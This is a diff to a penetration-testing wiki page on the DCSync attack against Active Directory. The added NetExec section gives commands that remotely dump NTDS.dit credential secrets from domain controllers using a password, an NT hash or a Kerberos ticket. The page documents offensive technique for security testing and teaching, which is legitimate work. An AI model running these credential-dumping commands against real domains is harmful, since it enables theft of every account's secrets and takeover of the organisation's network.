@@ -18,6 +18,8 @@ A setting exists in the account policy or when creating users telling the domain
 
 {% tabs %}
 {% tab title="UNIX-like" %}
+### Secretsdump.py
+
 On UNIX-like systems, this attack can be carried out with [Impacket](https://github.com/SecureAuthCorp/impacket/)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) which has the ability to run this attack on an elevated context obtained through [plaintext password stuffing](../../../../../ad/movement/credentials/bruteforcing/stuffing.md), [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md).
 
 ```bash
@@ -40,6 +42,24 @@ The secretsdump script creates the following files.
 | .kerberos  | Kerberos keys (DES, AES128 and AES256)                    |
 | .sam       | Domain controller's [SAM secrets](sam-and-lsa-secrets.md) |
 | .secrets   | Domain controller's [LSA secrets](sam-and-lsa-secrets.md) |
+
+### NetExec
+
+[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can also be used to achieve a DCsync.
+
+```bash
+### Shadow Copy
+# Remote dumping of NTDS.dit using drsuapi
+netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --ntds
+
+# Remote dumping of NTDS.dit using drsuapi (pass-the-hash)
+netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
+
+# Remote dumping of NTDS.dit using drsuapi (pass-the-ticket)
+netexec smb $TARGETS -k --use-kcache --ntds
+```
+
+### Ntlmrelayx.py
 
 This attack can also be operated with a [relayed NTLM authentication](../../../../../ad/movement/ntlm/relay.md), but only if the target domain controller is vulnerable to [Zerologon](../../../../../ad/movement/netlogon/zerologon.md) since the DRSUAPI always requires signing.
 
